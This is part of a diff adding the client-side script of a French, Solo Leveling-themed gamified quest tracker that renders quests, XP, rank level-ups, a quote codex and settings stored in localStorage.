+  const quests = QUESTS[activeRank] || [];
+
+  list.innerHTML = quests.map(quest => {
+    const prog = getQuestProgress(quest);
+    const isComplete = !!state.questsCompleted[`${activeRank}.${quest.id}`];
+    const isExpanded = expandedQuest === `${activeRank}.${quest.id}`;
+    const tc = TYPE_COLORS[quest.type];
+    const border = tc.border || rank.color;
+    const glow = tc.glow || rank.glow;
+
+    const header = `
+      <button class="quest-header" data-quest="${quest.id}">
+        <div class="quest-icon-box" style="border-color:${isComplete ? '#10b981' : glow}; background:${isComplete ? 'rgba(16,185,129,0.2)' : glow + '15'}; color:${isComplete ? '#10b981' : glow};">
+          ${isComplete ? ICONS.check : ICONS[quest.icon] || ICONS.terminal}
+        </div>
+        <div class="quest-info">
+          <div class="quest-tags">
+            <span class="quest-type-badge" style="color:${glow}; border-color:${glow};">${tc.label}</span>
+            <span class="quest-xp">+${quest.xp} XP</span>
+          </div>
+          <h3 class="quest-title">${quest.title}</h3>
+          <div class="quest-progress-row">
+            <div class="quest-progress-bar"><div class="quest-progress-fill" style="width:${prog.pct}%; background:${isComplete ? '#10b981' : glow};"></div></div>
+            <span class="quest-progress-text">${prog.done}/${prog.total}${prog.challengesTotal > 0 ? ' · ⚔️ ' + prog.challengesDone + '/' + prog.challengesTotal : ''}</span>
+          </div>
+        </div>
+        <span class="quest-chevron">${ICONS.chevron}</span>
+      </button>
+    `;
+
+    const objectivesHtml = `
+      <div class="objectives-section">
+        <div class="obj-section-label">▸ Objectifs</div>
+        ${quest.objectives.map(obj => {
+          const k = `${activeRank}.${quest.id}.${obj.id}`;
+          const checked = !!state.completed[k];
+          return `
+            <div class="objective">
+              <button class="obj-check ${checked ? 'checked' : ''}" data-obj="${obj.id}" data-quest="${quest.id}">${ICONS.check}</button>
+              <span class="obj-text ${checked ? 'done' : ''}">${obj.text}</span>
+            </div>
+          `;
+        }).join('')}
+      </div>
+    `;
+
+    const body = `
+      <div class="quest-body" style="border-color:${glow}40;">
+        ${objectivesHtml}
+        ${renderChallenges(quest.id)}
+        ${renderResources(quest)}
+      </div>
+    `;
+
+    return `
+      <div class="quest ${isComplete ? 'complete' : ''} ${isExpanded ? 'expanded' : ''}" style="border-color:${border}; box-shadow: 0 0 15px ${glow}20;">
+        ${header}
+        ${body}
+      </div>
+    `;
+  }).join('');
+
+  list.querySelectorAll('.quest-header').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const qid = btn.dataset.quest;
+      const k = `${activeRank}.${qid}`;
+      expandedQuest = expandedQuest === k ? null : k;
+      renderQuests();
+    });
+  });
+  list.querySelectorAll('.obj-check').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const qid = btn.dataset.quest;
+      const oid = btn.dataset.obj;
+      const quest = QUESTS[activeRank].find(q => q.id === qid);
+      toggleObjective(quest, oid);
+    });
+  });
+
+  // Challenge toggle buttons (hints/solutions)
+  list.querySelectorAll('.challenge-toggle-btn').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const targetId = btn.dataset.toggle;
+      const target = document.getElementById(targetId);
+      if (target) {
+        target.classList.toggle('show');
+      }
+    });
+  });
+
+  // Challenge complete checkbox
+  list.querySelectorAll('[data-challenge-check]').forEach(el => {
+    el.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const chId = el.dataset.challengeCheck;
+      const questEl = el.closest('.quest');
+      const questHeader = questEl ? questEl.querySelector('.quest-header') : null;
+      const qid = questHeader ? questHeader.dataset.quest : null;
+      if (!qid) return;
+      const key = `${activeRank}.${qid}.challenge.${chId}`;
+      if (state.completed[key]) {
+        delete state.completed[key];
+      } else {
+        state.completed[key] = true;
+        playSound('check');
+      }
+      saveState();
+      renderQuests();
+    });
+  });
+}
+
+function checkAutoLevelUp() {
+  // Auto level-up if all main+boss quests of current rank done (path is optional at A)
+  const idx = getRankIdx(state.rank);
+  if (idx >= RANKS.length - 1) return false;
+  const quests = QUESTS[state.rank] || [];
+  // Required quest types: main and boss (and at least one path for rank A)
+  const requiredQuests = quests.filter(q => q.type === 'main' || q.type === 'boss' || q.type === 'daily');
+  const allRequiredDone = requiredQuests.every(q => state.questsCompleted[`${state.rank}.${q.id}`]);
+
+  if (allRequiredDone) {
+    const next = RANKS[idx + 1];
+    state.rank = next.id;
+    state.xp = 0;
+    activeRank = next.id;
+    return next;
+  }
+  return null;
+}
+
+function toggleObjective(quest, objId) {
+  const key = `${activeRank}.${quest.id}.${objId}`;
+  const wasChecked = !!state.completed[key];
+  if (wasChecked) delete state.completed[key];
+  else { state.completed[key] = true; playSound('check'); }
+
+  const allKeys = quest.objectives.map(o => `${activeRank}.${quest.id}.${o.id}`);
+  const allDone = allKeys.every(k => state.completed[k]);
+  const wasQuestDone = !!state.questsCompleted[`${activeRank}.${quest.id}`];
+
+  let xpDelta = 0;
+  let statsDelta = { INT:0, AGI:0, PER:0, END:0, LCK:0 };
+  let questJustCompleted = false;
+
+  if (allDone && !wasQuestDone) {
+    state.questsCompleted[`${activeRank}.${quest.id}`] = true;
+    xpDelta = quest.xp;
+    const gains = STAT_GAINS[quest.type] || STAT_GAINS.main;
+    Object.keys(gains).forEach(s => statsDelta[s] = gains[s]);
+    showNotification(quest.title, quest.xp, gains);
+    speak('Quête complétée');
+    questJustCompleted = true;
+    // Show a victory quote
+    setTimeout(() => renderQuoteBanner(quest.type === 'boss' ? 'levelup' : 'questDone'), 800);
+  } else if (!allDone && wasQuestDone) {
+    delete state.questsCompleted[`${activeRank}.${quest.id}`];
+    xpDelta = -quest.xp;
+    const gains = STAT_GAINS[quest.type] || STAT_GAINS.main;
+    Object.keys(gains).forEach(s => statsDelta[s] = -gains[s]);
+  }
+
+  state.totalXp = Math.max(0, state.totalXp + xpDelta);
+  state.xp = state.xp + xpDelta;
+
+  Object.keys(statsDelta).forEach(s => {
+    state.stats[s] = Math.max(10, state.stats[s] + statsDelta[s]);
+  });
+
+  // Level up via XP threshold
+  const r = getRank(state.rank);
+  const idx = getRankIdx(state.rank);
+  let leveledUp = null;
+  if (xpDelta > 0 && state.xp >= r.xpToNext && idx < RANKS.length - 1) {
+    const next = RANKS[idx + 1];
+    state.xp = state.xp - r.xpToNext;
+    state.rank = next.id;
+    activeRank = next.id;
+    leveledUp = next;
+  }
+  // Also auto-level if all required quests completed (safety net)
+  if (!leveledUp && questJustCompleted) {
+    leveledUp = checkAutoLevelUp();
+  }
+  if (leveledUp) {
+    setTimeout(() => {
+      playSound('levelup');
+      playSound('glitch');
+      showLevelUp(leveledUp);
+      setTimeout(() => speak('Niveau supérieur. Arise.'), 600);
+    }, 400);
+  }
+  if (state.xp < 0) state.xp = 0;
+
+  saveState();
+  renderHeader(); renderStats(); renderTabs(); renderQuests();
+}
+
+function showNotification(title, xp, stats) {
+  const r = getRank(state.rank);
+  const n = document.getElementById('notification');
+  n.style.borderColor = r.glow;
+  n.style.boxShadow = `0 0 30px ${r.glow}50`;
+  document.getElementById('notifTag').style.color = r.glow;
+  document.getElementById('notifTitle').textContent = title;
+  const statsHtml = `<span class="notif-xp">+${xp} XP</span>` +
+    Object.entries(stats).map(([k,v]) => `<span class="notif-stat">+${v} ${k}</span>`).join('');
+  document.getElementById('notifStats').innerHTML = statsHtml;
+  n.classList.add('show');
+  setTimeout(() => n.classList.remove('show'), 3500);
+}
+
+function showLevelUp(rank) {
+  const ov = document.getElementById('levelUpOverlay');
+  document.documentElement.style.setProperty('--lu-glow', rank.glow);
+  document.getElementById('luTag').style.color = rank.glow;
+  const letter = document.getElementById('luLetter');
+  letter.textContent = rank.id;
+  letter.setAttribute('data-letter', rank.id);
+  letter.style.color = rank.glow;
+  letter.style.textShadow = `0 0 60px ${rank.glow}, 0 0 120px ${rank.glow}, 0 0 200px ${rank.glow}`;
+  document.getElementById('luName').textContent = rank.name;
+  document.getElementById('luName').style.color = rank.glow;
+  document.getElementById('luSub').textContent = rank.subtitle;
+  document.getElementById('luArise').style.color = rank.glow;
+  ov.classList.add('show');
+
+  // Vibration on mobile
+  if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
+
+  // Screen shake
+  document.querySelector('.container').classList.add('level-up-shake');
+  setTimeout(() => document.querySelector('.container').classList.remove('level-up-shake'), 1800);
+
+  setTimeout(() => ov.classList.remove('show'), 4500);
+}
+
+// ============= QUOTE & CODEX FUNCTIONS =============
+let currentQuoteContext = 'boot';
+
+function renderQuoteBanner(context = 'boot', forceNew = false) {
+  currentQuoteContext = context;
+  const quote = pickQuote(context);
+  if (!quote) return;
+  const isNew = discoverQuote(quote.id);
+
+  const banner = document.getElementById('quoteBanner');
+  banner.style.display = 'block';
+  banner.style.animation = 'none';
+  // Force reflow to restart animation
+  void banner.offsetWidth;
+  banner.style.animation = '';
+
+  document.getElementById('qbText').textContent = `« ${quote.text} »`;
+  document.getElementById('qbAuthor').textContent = quote.author;
+  document.getElementById('qbSource').textContent = quote.source ? ` · ${quote.source}` : '';
+  document.getElementById('qbNew').style.display = isNew ? 'block' : 'none';
+
+  // Tag based on context
+  const tagMap = {
+    boot: '[ MESSAGE DU SYSTÈME ]',
+    questDone: '[ VICTOIRE ]',
+    levelup: '[ TRANSCENDANCE ]',
+    boss: '[ COMBAT IMMINENT ]',
+    return: '[ RETOUR DU CHASSEUR ]',
+  };
+  document.getElementById('qbTag').textContent = tagMap[context] || '[ MESSAGE DU SYSTÈME ]';
+}
+
+function getQuoteCategory(quoteId) {
+  // Returns the prefix: sl, an, g, h, p, r
+  return quoteId.replace(/[0-9]+$/, '');
+}
+
+function renderCodex(filter = 'all') {
+  const list = document.getElementById('codexList');
+  const total = QUOTES.length;
+  const discovered = Object.keys(state.discoveredQuotes || {}).length;
+  document.getElementById('codexProgress').textContent = `${discovered} / ${total} découvertes (${Math.round(discovered/total*100)}%)`;
+
+  let filtered = QUOTES;
+  if (filter === 'discovered') {
+    filtered = QUOTES.filter(q => state.discoveredQuotes[q.id]);
+  } else if (filter === 'locked') {
+    filtered = QUOTES.filter(q => !state.discoveredQuotes[q.id]);
+  } else if (filter !== 'all') {
+    filtered = QUOTES.filter(q => getQuoteCategory(q.id) === filter);
+  }
+
+  if (filtered.length === 0) {
+    list.innerHTML = '<div class="codex-empty">Aucune citation dans cette catégorie pour l\'instant.<br/>Continue ta progression pour en débloquer plus.</div>';
+    return;
+  }
+
+  list.innerHTML = filtered.map(q => {
+    const isDiscovered = !!state.discoveredQuotes[q.id];
+    const cat = getQuoteCategory(q.id);
+    const sourceLabels = { sl: 'SOLO LEVELING', an: 'ANIMÉ', g: 'GAME', h: 'HACKER', p: 'PHILO', r: 'SYSTÈME' };
+    let displayText = q.text;
+    if (!isDiscovered) {
+      // Replace letters with ▪ but keep word shape
+      displayText = q.text.replace(/[a-zA-ZÀ-ÿ]/g, '▪');
+    }
+    return `
+      <div class="codex-quote ${isDiscovered ? 'discovered' : 'locked'}">
+        <div class="codex-quote-text">« ${displayText} »</div>
+        <div class="codex-quote-meta">
+          <span>— ${isDiscovered ? q.author : '???'} <span class="codex-quote-source">${isDiscovered && q.source ? '· ' + q.source : ''}</span></span>
+          <span class="codex-quote-tag ${cat}">${sourceLabels[cat] || '???'}</span>
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+function init() {
+  loadState();
+  loadSettings();
+  applyTheme();
+
+  if (!localStorage.getItem('warning-acknowledged')) {
+    document.getElementById('warningModal').style.display = 'flex';
+  }
+  document.getElementById('acceptWarning').addEventListener('click', () => {
+    localStorage.setItem('warning-acknowledged', 'true');
+    document.getElementById('warningModal').style.display = 'none';
+  });
+
+  document.getElementById('resetBtn').addEventListener('click', () => {
+    document.getElementById('resetModal').style.display = 'flex';
+  });
+  document.getElementById('cancelReset').addEventListener('click', () => {
+    document.getElementById('resetModal').style.display = 'none';
+  });
+  document.getElementById('confirmReset').addEventListener('click', () => {
+    state = JSON.parse(JSON.stringify(INITIAL_STATE));
+    activeRank = 'E'; expandedQuest = null;
+    saveState();
+    renderHeader(); renderStats(); renderTabs(); renderQuests();
+    document.getElementById('resetModal').style.display = 'none';
+  });
+
+  // Settings modal
+  document.getElementById('settingsBtn').addEventListener('click', () => {
+    document.getElementById('settingsModal').style.display = 'flex';
+    refreshSettingsUI();
+  });
+  document.getElementById('closeSettings').addEventListener('click', () => {
+    document.getElementById('settingsModal').style.display = 'none';
+  });
+  document.querySelectorAll('[data-theme-btn]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      settings.theme = btn.dataset.themeBtn;
+      saveSettings();
+      applyTheme();
+      refreshSettingsUI();
+    });
+  });
+  document.getElementById('toggleSfx').addEventListener('click', () => {
+    settings.sfx = !settings.sfx;
+    saveSettings();
+    refreshSettingsUI();
+    if (settings.sfx) playSound('check');
+  });
+  document.getElementById('toggleVoice').addEventListener('click', () => {
+    settings.voice = !settings.voice;
+    saveSettings();
+    refreshSettingsUI();
+    if (settings.voice) {
+      // Trigger voice loading
+      if ('speechSynthesis' in window) speechSynthesis.getVoices();
+      setTimeout(() => speak('Système activé'), 100);
+    }
+  });
+
+  if (!localStorage.getItem('install-hint-dismissed') && /Mobi|Android|iPhone/i.test(navigator.userAgent)) {
+    document.getElementById('installHint').classList.add('show');
+  }
+  document.getElementById('closeInstallHint').addEventListener('click', () => {
+    localStorage.setItem('install-hint-dismissed', 'true');
+    document.getElementById('installHint').classList.remove('show');
+  });
+
+  // Pre-load voices
+  if ('speechSynthesis' in window) {
+    speechSynthesis.getVoices();
+    speechSynthesis.onvoiceschanged = () => speechSynthesis.getVoices();
+  }
+
+  // Codex modal
+  document.getElementById('codexBtn').addEventListener('click', () => {
+    document.getElementById('codexModal').style.display = 'flex';
+    renderCodex(currentCodexFilter);
+  });
+  document.getElementById('closeCodex').addEventListener('click', () => {
+    document.getElementById('codexModal').style.display = 'none';
+  });
+  document.querySelectorAll('.codex-filter').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.codex-filter').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      currentCodexFilter = btn.dataset.filter;
+      renderCodex(currentCodexFilter);
+    });
+  });
+
+  // Quote banner — refresh button
+  document.getElementById('qbRefresh').addEventListener('click', () => {
+    renderQuoteBanner(currentQuoteContext);
+  });
+  document.getElementById('quoteBanner').addEventListener('click', (e) => {
+    // Click on banner (but not refresh button) opens Codex
+    if (e.target.closest('.quote-refresh')) return;
+    document.getElementById('codexModal').style.display = 'flex';
+    renderCodex(currentCodexFilter);
+  });
+
+  // Show initial quote — detect if returning user
+  const lastVisit = parseInt(localStorage.getItem('hunter-last-visit') || '0', 10);
+  const now = Date.now();
+  const hoursAway = (now - lastVisit) / (1000 * 60 * 60);
+  let initialContext = 'boot';
+  if (lastVisit && hoursAway > 24) initialContext = 'return';
+  renderQuoteBanner(initialContext);
+  localStorage.setItem('hunter-last-visit', String(now));
+
+  // Footer quote (random motivation)
+  const footerQuote = pickQuote('motivation') || QUOTES[0];
+  if (footerQuote) {
+    discoverQuote(footerQuote.id);
+    document.getElementById('footerQuote').textContent = `« ${footerQuote.text} »`;
+    document.getElementById('footerQuoteAuthor').textContent = `— ${footerQuote.author}${footerQuote.source ? ' · ' + footerQuote.source : ''}`;
+  }
+
+  renderHeader(); renderStats(); renderTabs(); renderQuests();
+}
+
+let currentCodexFilter = 'all';
+
+function refreshSettingsUI() {
+  document.querySelectorAll('[data-theme-btn]').forEach(btn => {
+    btn.classList.toggle('active', btn.dataset.themeBtn === settings.theme);
+  });
+  document.getElementById('toggleSfx').classList.toggle('on', settings.sfx);
+  document.getElementById('toggleVoice').classList.toggle('on', settings.voice);
+}
+
+if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+else init();
+</script>
+</body>
+</html>
